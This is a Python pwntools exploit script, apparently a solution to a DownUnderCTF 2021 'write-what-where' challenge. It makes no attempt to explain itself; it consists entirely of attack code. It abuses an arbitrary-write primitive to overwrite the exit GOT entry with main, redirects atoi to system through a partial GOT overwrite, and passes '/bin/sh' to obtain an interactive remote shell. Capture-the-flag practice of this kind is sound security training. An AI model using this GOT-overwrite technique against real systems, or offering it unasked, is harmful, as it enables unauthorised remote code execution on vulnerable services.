from pwn import *

p = remote('pwn-2021.duc.tf', 31920)
elf = ELF('./write-what-where')
libc = ELF('./libc.so.6')

main = 0x4011a9

exit_got = elf.got['exit']
atoi_got = elf.got['atoi']

p.sendafter('what?\n', p32(main))

payload = bytes(str(exit_got), 'utf-8')
payload = payload.rjust(8, b'0')
p.sendlineafter('where?\n', payload)

system = 0xfa600000
p.sendafter('what?\n', p32(system))

payload = bytes(str(atoi_got - 2), 'utf-8')
payload = payload.rjust(8, b'0')
p.sendlineafter('where?\n', payload)

p.sendafter('what?\n', '0000')
p.sendlineafter('where?\n', b'/bin/sh\x00')

p.interactive()